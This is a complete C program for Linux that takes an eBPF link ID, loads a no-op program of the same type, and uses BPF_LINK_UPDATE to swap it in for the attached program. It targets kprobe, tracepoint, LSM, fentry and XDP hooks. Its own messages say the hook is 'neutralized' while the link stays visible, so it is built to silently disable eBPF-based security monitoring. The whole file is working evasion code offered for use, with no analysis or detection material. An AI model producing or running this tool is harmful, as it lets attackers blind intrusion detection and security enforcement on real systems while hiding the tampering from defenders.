#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#define BPF_ATTR_SZ(f) \
    (offsetof(union bpf_attr, f) + sizeof(((union bpf_attr *)0)->f))

static int bpf_call(int cmd, union bpf_attr *a, unsigned sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static const struct bpf_insn noop_insns[] = {
    { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0 },
    { .code = BPF_JMP   | BPF_EXIT },
};

static const struct bpf_insn xdp_noop_insns[] = {
    { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 2 },
    { .code = BPF_JMP   | BPF_EXIT },
};

static const char *prog_type_str(uint32_t t)
{
    switch (t) {
    case BPF_PROG_TYPE_KPROBE:           return "kprobe";
    case BPF_PROG_TYPE_TRACEPOINT:       return "tracepoint";
    case BPF_PROG_TYPE_RAW_TRACEPOINT:   return "raw_tracepoint";
    case BPF_PROG_TYPE_TRACING:          return "tracing/fentry";
    case BPF_PROG_TYPE_LSM:              return "lsm";
    case BPF_PROG_TYPE_XDP:              return "xdp";
    default:                             return "other";
    }
}

static int load_noop(uint32_t prog_type, uint32_t expected_attach_type)
{
    const struct bpf_insn *insns    = noop_insns;
    uint32_t               insn_cnt = 2;

    if (prog_type == BPF_PROG_TYPE_XDP)
        insns = xdp_noop_insns;

    char log_buf[512] = {};

    union bpf_attr a        = {};
    a.prog_type             = prog_type;
    a.expected_attach_type  = expected_attach_type;
    a.insns                 = (uint64_t)(uintptr_t)insns;
    a.insn_cnt              = insn_cnt;
    a.license               = (uint64_t)(uintptr_t)"GPL";
    a.log_buf               = (uint64_t)(uintptr_t)log_buf;
    a.log_size              = sizeof(log_buf);
    a.log_level             = 1;

    int fd = bpf_call(BPF_PROG_LOAD, &a, BPF_ATTR_SZ(expected_attach_type));
    if (fd < 0)
        fprintf(stderr, "[-] BPF_PROG_LOAD: %s\n    verifier: %s\n",
                strerror(errno), log_buf);
    return fd;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s <link_id>          redirect link to no-op (link stays visible)\n"
            "  %s <link_id> --list   show link info only, do not update\n"
            "\n"
            "requires: CAP_BPF  (Linux 5.9+)\n"
            "note: LSM/fentry/fexit types need BTF and may fail at prog load\n",
            argv[0], argv[0]);
        return 1;
    }

    uint32_t link_id = (uint32_t)atoi(argv[1]);
    int list_only    = (argc >= 3 && strcmp(argv[2], "--list") == 0);

    union bpf_attr la = {}; la.link_id = link_id;
    int link_fd = bpf_call(BPF_LINK_GET_FD_BY_ID, &la, BPF_ATTR_SZ(link_id));
    if (link_fd < 0) { perror("BPF_LINK_GET_FD_BY_ID"); return 1; }

    struct bpf_link_info linfo = {};
    union bpf_attr lia = {};
    lia.info.bpf_fd   = (uint32_t)link_fd;
    lia.info.info_len = sizeof(linfo);
    lia.info.info     = (uint64_t)(uintptr_t)&linfo;
    if (bpf_call(BPF_OBJ_GET_INFO_BY_FD, &lia, BPF_ATTR_SZ(info)) < 0) {
        perror("BPF_OBJ_GET_INFO_BY_FD (link)"); close(link_fd); return 1;
    }

    union bpf_attr pfa = {}; pfa.prog_id = linfo.prog_id;
    int prog_fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &pfa, BPF_ATTR_SZ(prog_id));
    if (prog_fd < 0) { perror("BPF_PROG_GET_FD_BY_ID"); close(link_fd); return 1; }

    struct bpf_prog_info pinfo = {};
    union bpf_attr pia = {};
    pia.info.bpf_fd   = (uint32_t)prog_fd;
    pia.info.info_len = sizeof(pinfo);
    pia.info.info     = (uint64_t)(uintptr_t)&pinfo;
    if (bpf_call(BPF_OBJ_GET_INFO_BY_FD, &pia, BPF_ATTR_SZ(info)) < 0) {
        perror("BPF_OBJ_GET_INFO_BY_FD (prog)"); close(prog_fd); close(link_fd); return 1;
    }
    close(prog_fd);

    printf("[*] link id=%-5u  prog_id=%-5u  type=%s\n",
           link_id, linfo.prog_id, prog_type_str(pinfo.type));

    if (list_only) { close(link_fd); return 0; }

    int noop_fd = load_noop(pinfo.type, 0);
    if (noop_fd < 0) { close(link_fd); return 1; }

    union bpf_attr ua          = {};
    ua.link_update.link_fd     = (uint32_t)link_fd;
    ua.link_update.new_prog_fd = (uint32_t)noop_fd;
    ua.link_update.flags       = 0;
    ua.link_update.old_prog_fd = 0;

    if (bpf_call(BPF_LINK_UPDATE, &ua, BPF_ATTR_SZ(link_update)) < 0) {
        fprintf(stderr, "[-] BPF_LINK_UPDATE: %s\n", strerror(errno));
        close(noop_fd); close(link_fd); return 1;
    }

    printf("[+] link id=%u redirected to no-op  (hook neutralized, link still visible)\n",
           link_id);

    close(noop_fd);
    close(link_fd);
    return 0;
}
